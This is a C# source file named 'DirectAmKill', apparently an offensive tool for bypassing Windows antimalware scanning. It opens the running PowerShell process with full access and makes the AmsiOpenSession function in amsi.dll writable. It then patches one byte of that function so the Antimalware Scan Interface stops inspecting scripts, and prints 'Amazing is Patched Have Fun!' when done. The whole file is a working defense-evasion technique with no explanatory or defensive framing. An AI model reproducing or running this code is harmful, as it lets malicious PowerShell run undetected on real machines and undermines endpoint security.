using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DirectAmKill
{
    internal class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint LdrLoadDll(IntPtr PathToFile, uint Flags, ref UNICODE_STRING ModuleFileName, out IntPtr ModuleHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtClose(IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint LdrUnloadDll(IntPtr ModuleHandle);
    
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint BufferSize, out uint BytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint LdrGetProcedureAddress(IntPtr hModule, IntPtr ProcedureName, int ProcedureNumber, out IntPtr pFunction);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public uint Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        static void Main(string[] args)
        {
            // Obtain the process ID of the Powershell process
            int procId = Process.GetProcessesByName("Powershell")[0].Id;

            // Open the target process and get a handle to its memory
            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID cid = new CLIENT_ID();
            cid.UniqueProcess = new IntPtr(procId);

            uint ntStatus = NtOpenProcess(out hProcess, 0x1F0FFF, ref oa, ref cid);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to open process: {0}", ntStatus);
                return;
            }

            // Load the amsi.dll library and obtain the address of the AmsiOpenSession function
            UNICODE_STRING ModuleFileName = new UNICODE_STRING();
            RtlInitUnicodeString(ref ModuleFileName, "amsi.dll");
            IntPtr hModule = IntPtr.Zero;

            ntStatus = LdrLoadDll(IntPtr.Zero, 0, ref ModuleFileName, out hModule);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to load amsi.dll: {0}", ntStatus);
                NtClose(hProcess);
                return;
            }

            IntPtr pAmsiOpenSession = IntPtr.Zero;

            // Using an Ordinal 3 here as string was having an issue finding AmsiOpenSession
            ntStatus = LdrGetProcedureAddress(hModule, IntPtr.Zero, 3, out pAmsiOpenSession);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to find AmsiOpenSession function: {0}", ntStatus);
                LdrUnloadDll(hModule);
                NtClose(hProcess);
                return;
            }
           
            // Modify the memory protection of the AmsiOpenSession function
            IntPtr protectionBase = pAmsiOpenSession;
            IntPtr regionSize = new IntPtr(1);
            uint oldProtect = 0;
            uint newProtect = 0x40;

            ntStatus = NtProtectVirtualMemory(hProcess, ref protectionBase, ref regionSize, newProtect, out oldProtect);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to modify memory protection: {0}", ntStatus);
                LdrUnloadDll(hModule);
                NtClose(hProcess);
                return;
            }

            // Write the patch to the AmsiOpenSession function
            byte[] patch = { 0x75 };
            uint bytesWritten = 0;

            ntStatus = NtWriteVirtualMemory(hProcess, pAmsiOpenSession + 0x03, patch, 1, out bytesWritten);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to write to process memory: {0}", ntStatus);
            }

            // Restore the original memory protection of the AmsiOpenSession function
            ntStatus = NtProtectVirtualMemory(hProcess, ref protectionBase, ref regionSize, oldProtect, out oldProtect);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to restore memory protection: {0}", ntStatus);
            }

            Console.WriteLine("Amazing is Patched Have Fun!");

            // Unload the amsi.dll library
            ntStatus = LdrUnloadDll(hModule);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to unload amsi.dll: {0}", ntStatus);
            }

            // Close the process handle
            ntStatus = NtClose(hProcess);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to close process handle: {0}", ntStatus);
            }
        }
    }
}


